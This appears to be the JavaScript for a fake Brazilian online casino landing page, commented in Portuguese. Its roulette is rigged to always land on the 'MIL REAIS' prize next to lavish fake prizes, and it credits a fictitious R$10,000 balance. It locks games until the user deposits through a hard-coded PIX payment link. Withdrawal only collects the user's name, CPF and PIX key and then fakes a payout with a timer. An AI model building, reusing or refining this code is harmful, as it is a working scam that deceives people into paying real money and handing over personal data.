// ========== CONFIGURAÇÃO DO GATEWAY PIX ==========
// EDITE AQUI O LINK DO SEU GATEWAY PIX
const PIX_GATEWAY_URL = 'https://seu-gateway-pix.com/pagamento?valor=';

// ========== VARIÁVEIS GLOBAIS ==========
let currentUser = null;
let userBalance = 10000;
let hasDeposited = false;
let selectedDepositAmount = 0;
let isSpinning = false;
let wheelRotation = 0;
let pendingWithdrawal = false;
let withdrawAmount = 0;

// ========== CONFIGURAÇÃO DA ROLETA ==========
// 10 fatias - a fatie "MIL REAIS" (índice 3) é o prêmio de 10mil
const wheelSlices = [
    { 
        label: 'R$ 1 MILHÃO', 
        sublabel: 'EM SALDO REAL',
        color: '#1a5f1a', 
        textColor: '#FFD700'
    },
    { 
        label: 'iPhone 17', 
        sublabel: 'PRO MAX + 5 MIL',
        color: '#c9a227', 
        textColor: '#000'
    },
    { 
        label: 'PORSCHE', 
        sublabel: '800 MIL EM SALDO',
        color: '#2d5a3d', 
        textColor: '#fff'
    },
    { 
        label: 'MIL REAIS', 
        sublabel: 'EM SALDO REAL',
        color: '#1e3a8a', 
        textColor: '#FFD700'
    },
    { 
        label: 'BMW R1250GS', 
        sublabel: '100 MIL EM SALDO',
        color: '#dc2626', 
        textColor: '#fff'
    },
    { 
        label: '100 GIROS', 
        sublabel: 'FORTUNE RABBIT',
        color: '#7c3aed', 
        textColor: '#fff'
    },
    { 
        label: 'R$ 100 MIL', 
        sublabel: 'EM SALDO REAL',
        color: '#059669', 
        textColor: '#FFD700'
    },
    { 
        label: '50 GIROS', 
        sublabel: 'FORTUNE TIGER',
        color: '#ea580c', 
        textColor: '#fff'
    },
    { 
        label: 'PS5', 
        sublabel: '+ 4 MIL EM SALDO',
        color: '#4c1d95', 
        textColor: '#fff'
    },
    { 
        label: '50 GIROS', 
        sublabel: 'FORTUNE SNAKE',
        color: '#0891b2', 
        textColor: '#fff'
    }
];

// Índice do prêmio vencedor (MIL REAIS = índice 3)
const winningIndex = 3;

// ========== LISTA DE JOGOS ==========
const games = [
    { name: 'Fortune Tiger', provider: 'PG Soft', image: 'images/game-fortune-tiger.jpg' },
    { name: 'Fortune Rabbit', provider: 'PG Soft', image: 'images/game-fortune-rabbit.jpg' },
    { name: 'Fortune Ox', provider: 'PG Soft', image: 'images/game-fortune-ox.jpg' },
    { name: 'Fortune Mouse', provider: 'PG Soft', image: 'images/game-fortune-mouse.jpg' },
    { name: 'Fortune Dragon', provider: 'PG Soft', image: 'images/game-fortune-dragon.jpg' },
    { name: 'Gates of Olympus', provider: 'Pragmatic', image: 'images/game-gates-olympus.jpg' },
    { name: 'Sweet Bonanza', provider: 'Pragmatic', image: 'images/game-sweet-bonanza.jpg' },
    { name: 'Starlight Princess', provider: 'Pragmatic', image: 'images/game-starlight-princess.jpg' },
    { name: 'Big Bass Bonanza', provider: 'Pragmatic', image: 'images/game-big-bass.jpg' },
    { name: 'Wolf Gold', provider: 'Pragmatic', image: 'images/game-wolf-gold.jpg' },
    { name: 'Book of Dead', provider: 'Play\'n GO', image: 'images/game-book-dead.jpg' },
    { name: 'Legacy of Dead', provider: 'Play\'n GO', image: 'images/game-book-dead.jpg' }
];

// ========== INICIALIZAÇÃO ==========
document.addEventListener('DOMContentLoaded', function() {
    // Verifica se usuário já está logado
    checkLoggedUser();
    
    // Inicializa a roleta
    initRoulette();
    
    // Gera os jogos
    generateGames();
    
    // Máscaras de input
    setupInputMasks();
    
    // Fecha menu ao clicar fora
    document.addEventListener('click', function(e) {
        const userMenu = document.getElementById('user-menu');
        const dropdown = document.getElementById('user-menu-dropdown');
        if (userMenu && dropdown && !userMenu.contains(e.target) && !dropdown.contains(e.target)) {
            dropdown.style.display = 'none';
        }
    });
});

// ========== NAVEGAÇÃO ENTRE TELAS ==========
function showScreen(screenId) {
    // Esconde todas as telas
    document.querySelectorAll('.screen').forEach(screen => {
        screen.style.display = 'none';
    });
    
    // Mostra a tela solicitada
    const targetScreen = document.getElementById(screenId);
    if (targetScreen) {
        targetScreen.style.display = 'block';
    }
    
    // Scroll para o topo
    window.scrollTo(0, 0);
}

// ========== VERIFICAÇÃO DE IDADE ==========
function confirmAge(confirmed) {
    if (confirmed) {
        localStorage.setItem('ageConfirmed', 'true');
        showScreen('register-screen');
    } else {
        alert('Você precisa ter 18 anos ou mais para acessar este site.');
        window.location.href = 'https://www.google.com';
    }
}

// ========== CADASTRO ==========
function handleRegister(event) {
    event.preventDefault();
    
    const username = document.getElementById('reg-username').value.trim();
    const email = document.getElementById('reg-email').value.trim();
    const password = document.getElementById('reg-password').value;
    
    // Validações
    if (username.length < 3) {
        alert('O nome de usuário deve ter pelo menos 3 caracteres.');
        return;
    }
    
    if (!validateEmail(email)) {
        alert('Por favor, digite um email válido.');
        return;
    }
    
    if (password.length < 6) {
        alert('A senha deve ter pelo menos 6 caracteres.');
        return;
    }
    
    // Salva usuário
    currentUser = {
        username: username,
        email: email,
        password: password,
        balance: 10000,
        hasDeposited: false,
        registerDate: new Date().toISOString()
    };
    
    localStorage.setItem('currentUser', JSON.stringify(currentUser));
    
    // Atualiza interface
    updateUserInterface();
    
    // Vai para a roleta
    showScreen('roulette-screen');
}

function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// ========== MÁSCARAS DE INPUT ==========
function setupInputMasks() {
    // CPF
    const cpfInput = document.getElementById('withdraw-cpf');
    if (cpfInput) {
        cpfInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length <= 11) {
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})(\d)/, '$1.$2');
                value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
                e.target.value = value;
            }
        });
    }
}

// ========== ROLETA ==========
function initRoulette() {
    const canvas = document.getElementById('roulette-wheel');
    if (!canvas) return;
    
    const ctx = canvas.getContext('2d');
    const centerX = canvas.width / 2;
    const centerY = canvas.height / 2;
    const radius = 160;
    
    drawWheel(ctx, centerX, centerY, radius, 0);
}

function drawWheel(ctx, centerX, centerY, radius, rotation) {
    ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);
    
    const sliceCount = wheelSlices.length;
    const sliceAngle = (2 * Math.PI) / sliceCount;
    
    // Desenha as fatias
    wheelSlices.forEach((slice, index) => {
        const startAngle = index * sliceAngle + rotation;
        const endAngle = (index + 1) * sliceAngle + rotation;
        
        // Fatia
        ctx.beginPath();
        ctx.moveTo(centerX, centerY);
        ctx.arc(centerX, centerY, radius, startAngle, endAngle);
        ctx.closePath();
        ctx.fillStyle = slice.color;
        ctx.fill();
        
        // Borda dourada
        ctx.strokeStyle = '#FFD700';
        ctx.lineWidth = 3;
        ctx.stroke();
        
        // Texto principal
        ctx.save();
        ctx.translate(centerX, centerY);
        ctx.rotate(startAngle + sliceAngle / 2);
        ctx.textAlign = 'center';
        
        // Label principal
        ctx.fillStyle = slice.textColor;
        ctx.font = 'bold 11px Poppins';
        ctx.fillText(slice.label, radius * 0.65, -5);
        
        // Sublabel
        ctx.font = '8px Poppins';
        ctx.fillText(slice.sublabel, radius * 0.65, 8);
        
        ctx.restore();
    });
    
    // Centro da roleta (botão GIRAR)
    ctx.beginPath();
    ctx.arc(centerX, centerY, 45, 0, 2 * Math.PI);
    ctx.fillStyle = '#1a1a1a';
    ctx.fill();
    ctx.strokeStyle = '#FFD700';
    ctx.lineWidth = 4;
    ctx.stroke();
    
    // Círculo interno dourado
    ctx.beginPath();
    ctx.arc(centerX, centerY, 35, 0, 2 * Math.PI);
    const gradient = ctx.createRadialGradient(centerX, centerY, 0, centerX, centerY, 35);
    gradient.addColorStop(0, '#FFD700');
    gradient.addColorStop(1, '#FFA500');
    ctx.fillStyle = gradient;
    ctx.fill();
    
    // Luzes ao redor da roleta
    const lightCount = 20;
    for (let i = 0; i < lightCount; i++) {
        const angle = (i / lightCount) * 2 * Math.PI + rotation * 2;
        const lightX = centerX + Math.cos(angle) * (radius + 12);
        const lightY = centerY + Math.sin(angle) * (radius + 12);
        
        ctx.beginPath();
        ctx.arc(lightX, lightY, 4, 0, 2 * Math.PI);
        ctx.fillStyle = i % 2 === 0 ? '#FFD700' : '#fff';
        ctx.fill();
    }
    
    // Borda externa dourada
    ctx.beginPath();
    ctx.arc(centerX, centerY, radius + 5, 0, 2 * Math.PI);
    ctx.strokeStyle = '#FFD700';
    ctx.lineWidth = 4;
    ctx.stroke();
}

function spinWheel() {
    if (isSpinning) return;
    
    isSpinning = true;
    const spinBtn = document.getElementById('spin-btn');
    spinBtn.disabled = true;
    
    const canvas = document.getElementById('roulette-wheel');
    const ctx = canvas.getContext('2d');
    const centerX = canvas.width / 2;
    const centerY = canvas.height / 2;
    const radius = 160;
    
    const sliceCount = wheelSlices.length;
    const sliceAngle = (2 * Math.PI) / sliceCount;
    const winningAngle = winningIndex * sliceAngle;
    
    // Calcula rotação para parar no prêmio vencedor
    const spins = 5 + Math.random() * 3;
    const finalRotation = spins * 2 * Math.PI - winningAngle - sliceAngle / 2 + Math.PI / 2;
    
    let currentRotation = wheelRotation;
    const startTime = Date.now();
    const duration = 6000;
    
    function animate() {
        const elapsed = Date.now() - startTime;
        const progress = Math.min(elapsed / duration, 1);
        
        // Easing para desaceleração suave
        const easeOut = 1 - Math.pow(1 - progress, 3);
        
        currentRotation = wheelRotation + (finalRotation - wheelRotation) * easeOut;
        
        drawWheel(ctx, centerX, centerY, radius, currentRotation);
        
        if (progress < 1) {
            requestAnimationFrame(animate);
        } else {
            wheelRotation = currentRotation % (2 * Math.PI);
            isSpinning = false;
            setTimeout(showWinPopup, 500);
        }
    }
    
    animate();
}

function showWinPopup() {
    const popup = document.getElementById('win-popup');
    popup.style.display = 'block';
    createConfetti();
}

function createConfetti() {
    const container = document.getElementById('confetti-container');
    container.innerHTML = '';
    
    const colors = ['#FFD700', '#FF6B00', '#FF1493', '#00C851', '#33b5e5', '#9370DB'];
    
    for (let i = 0; i < 60; i++) {
        const confetti = document.createElement('div');
        confetti.className = 'confetti';
        confetti.style.cssText = `
            background: ${colors[Math.floor(Math.random() * colors.length)]};
            left: ${Math.random() * 100}%;
            animation-delay: ${Math.random() * 2}s;
            border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
        `;
        container.appendChild(confetti);
    }
}

function goToCasino() {
    document.getElementById('win-popup').style.display = 'none';
    showScreen('casino-screen');
    updateBalance();
}

// ========== JOGOS ==========
function generateGames() {
    const grid = document.getElementById('games-grid');
    if (!grid) return;
    
    grid.innerHTML = '';
    
    games.forEach(game => {
        const card = document.createElement('div');
        card.className = 'game-card';
        card.onclick = () => handleGameClick(game.name);
        
        card.innerHTML = `
            <div class="game-image">
                <img src="${game.image}" alt="${game.name}" loading="lazy" onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\\'display:flex;align-items:center;justify-content:center;height:100%;background:var(--gray-light);\\'><span style=\\'font-size:3rem\\'>🎰</span></div>'">
            </div>
            <div class="game-info">
                <p class="game-title">${game.name}</p>
                <p class="game-provider">${game.provider}</p>
            </div>
        `;
        
        grid.appendChild(card);
    });
}

function handleGameClick(gameName) {
    // Verifica se tem saque pendente
    if (pendingWithdrawal) {
        showModal('withdraw-block-modal');
        return;
    }
    
    // Verifica se já depositou
    if (!hasDeposited) {
        showModal('block-deposit-modal');
        return;
    }
    
    // Se depositou, mostra mensagem de jogo em breve
    alert(`O jogo ${gameName} será carregado em breve!`);
}

function showSection(section, element) {
    // Remove active de todos
    document.querySelectorAll('.nav-link').forEach(link => {
        link.classList.remove('active');
    });
    
    // Adiciona active no clicado
    if (element) {
        element.classList.add('active');
    }
}

// ========== DEPÓSITO ==========
function showDeposit() {
    showModal('deposit-modal');
    
    // Limpa seleção anterior
    document.querySelectorAll('.deposit-btn').forEach(btn => {
        btn.classList.remove('selected');
    });
    document.getElementById('custom-deposit').value = '';
    selectedDepositAmount = 0;
}

function closeDeposit() {
    closeModal('deposit-modal');
}

function selectDeposit(amount) {
    selectedDepositAmount = amount;
    document.getElementById('custom-deposit').value = '';
    
    document.querySelectorAll('.deposit-btn').forEach(btn => {
        btn.classList.remove('selected');
    });
    event.target.closest('.deposit-btn').classList.add('selected');
}

function confirmDeposit()  {

    const customAmount = document.getElementById('custom-deposit').value;
    const amount = customAmount ? parseFloat(customAmount) : selectedDepositAmount;

    if (!amount || amount < 20) {
        alert('Por favor, selecione ou digite um valor válido (mínimo R$ 20,00).');
        return;
    }

    // Converte para centavos
    const amountInCents = Math.round(amount * 100);

    // Redireciona com valor automático
    window.location.href = "https://multi.paradisepags.com/p/pix_1f05b1ccd5e7?value=" + amountInCents;

}

function showDepositSuccess(amount) {
    hasDeposited = true;
    userBalance += amount;
    
    // Atualiza usuário no localStorage
    if (currentUser) {
        currentUser.hasDeposited = true;
        currentUser.balance = userBalance;
        localStorage.setItem('currentUser', JSON.stringify(currentUser));
    }
    
    document.getElementById('success-amount').textContent = formatCurrency(amount);
    
    // Mostra mensagem de bônus se for primeiro depósito
    const bonusMsg = document.getElementById('success-bonus');
    if (amount >= 100) {
        bonusMsg.textContent = '+ Bônus de boas-vindas liberado!';
        bonusMsg.style.display = 'block';
    } else {
        bonusMsg.style.display = 'none';
    }
    
    showModal('success-modal');
    updateBalance();
}

function closeSuccess() {
    closeModal('success-modal');
}

function copyPixKey() {
    const pixCode = document.getElementById('pix-code').textContent;
    navigator.clipboard.writeText(pixCode).then(() => {
        alert('Chave PIX copiada!');
    });
}

// ========== SAQUE ==========
function showWithdraw() {
    // Verifica se tem saque pendente
    if (pendingWithdrawal) {
        showModal('withdraw-block-modal');
        return;
    }
    
    document.getElementById('withdraw-balance').textContent = formatCurrency(userBalance);
    
    const blockMessage = document.getElementById('withdraw-block-message');
    const withdrawForm = document.getElementById('withdraw-form');
    
    // Verifica se pode sacar (saldo > 10.100)
    if (userBalance <= 10100) {
        blockMessage.style.display = 'block';
        withdrawForm.style.display = 'none';
    } else {
        blockMessage.style.display = 'none';
        withdrawForm.style.display = 'flex';
        
        // Preenche campos se usuário existir
        if (currentUser) {
            document.getElementById('withdraw-name').value = currentUser.username || '';
        }
    }
    
    showModal('withdraw-modal');
}

function closeWithdraw() {
    closeModal('withdraw-modal');
}

function confirmWithdraw() {
    const name = document.getElementById('withdraw-name').value.trim();
    const cpf = document.getElementById('withdraw-cpf').value.trim();
    const pix = document.getElementById('withdraw-pix').value.trim();
    const amount = parseFloat(document.getElementById('withdraw-amount').value);
    
    // Validações
    if (!name) {
        alert('Digite seu nome completo.');
        return;
    }
    
    if (cpf.length < 14) {
        alert('Digite um CPF válido.');
        return;
    }
    
    if (!pix) {
        alert('Digite sua chave PIX.');
        return;
    }
    
    if (!amount || amount <= 0) {
        alert('Digite um valor válido para saque.');
        return;
    }
    
    if (amount > userBalance) {
        alert('Saldo insuficiente.');
        return;
    }
    
    // Processa saque
    withdrawAmount = amount;
    pendingWithdrawal = true;
    
    closeWithdraw();
    
    // Mostra processamento
    document.getElementById('withdraw-processing-amount').textContent = formatCurrency(amount);
    showModal('withdraw-processing-modal');
    
    // Simula processamento
    setTimeout(() => {
        closeModal('withdraw-processing-modal');
        
        // Atualiza saldo
        userBalance -= amount;
        
        if (currentUser) {
            currentUser.balance = userBalance;
            localStorage.setItem('currentUser', JSON.stringify(currentUser));
        }
        
        updateBalance();
        
        // Mostra sucesso
        document.getElementById('withdraw-success-amount').textContent = formatCurrency(amount);
        showModal('withdraw-success-modal');
    }, 2000);
}

function closeWithdrawSuccess() {
    closeModal('withdraw-success-modal');
}

function closeWithdrawBlock() {
    closeModal('withdraw-block-modal');
}

function closeBlockDeposit() {
    closeModal('block-deposit-modal');
}

// ========== MENU DO USUÁRIO ==========
function toggleUserMenu() {
    const dropdown = document.getElementById('user-menu-dropdown');
    if (dropdown.style.display === 'block') {
        dropdown.style.display = 'none';
    } else {
        dropdown.style.display = 'block';
    }
}

function logout() {
    localStorage.removeItem('currentUser');
    localStorage.removeItem('ageConfirmed');
    location.reload();
}

// ========== MODAIS ==========
function showModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'block';
    }
}

function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'none';
    }
}

// ========== UTILITÁRIOS ==========
function updateBalance() {
    const balanceDisplay = document.getElementById('balance-display');
    if (balanceDisplay) {
        balanceDisplay.textContent = formatCurrency(userBalance);
    }
}

function formatCurrency(value) {
    return 'R$ ' + value.toLocaleString('pt-BR', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    });
}

function updateUserInterface() {
    if (currentUser) {
        const usernameDisplay = document.getElementById('username-display');
        if (usernameDisplay) {
            usernameDisplay.textContent = currentUser.username;
        }
        
        userBalance = currentUser.balance || 10000;
        hasDeposited = currentUser.hasDeposited || false;
        updateBalance();
    }
}

function checkLoggedUser() {
    const ageConfirmed = localStorage.getItem('ageConfirmed');
    const savedUser = localStorage.getItem('currentUser');
    
    if (savedUser) {
        currentUser = JSON.parse(savedUser);
        updateUserInterface();
        
        // Se já tem usuário, vai direto para o cassino
        showScreen('casino-screen');
    } else if (ageConfirmed === 'true') {
        // Se confirmou idade mas não tem usuário, vai para cadastro
        showScreen('register-screen');
    }
    // Senão, fica na tela de idade (padrão)
}

// ========== DEPÓSITO CUSTOM ==========
document.addEventListener('DOMContentLoaded', function() {
    const customDeposit = document.getElementById('custom-deposit');
    if (customDeposit) {
        customDeposit.addEventListener('input', function() {
            document.querySelectorAll('.deposit-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
            selectedDepositAmount = parseFloat(this.value) || 0;
        });
    }
});
